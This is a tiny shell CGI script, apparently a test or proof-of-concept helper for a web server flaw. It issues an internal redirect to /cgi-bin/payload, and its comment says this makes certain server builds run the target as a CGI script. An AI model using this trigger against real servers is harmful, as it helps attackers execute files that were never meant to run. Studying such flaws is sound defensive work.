#!/bin/sh
# This is a legitimate CGI that triggers an internal redirect.
# On vulnerable builds (2.4.60-2.4.68) the redirect target inherits
# the CGI handler even if it is not a CGI script.
if [ -n "$QUERY_STRING" ]; then
    printf "Location: /cgi-bin/payload?%s\n" "$QUERY_STRING"
else
    printf "Location: /cgi-bin/payload\n"
fi
printf "\n"
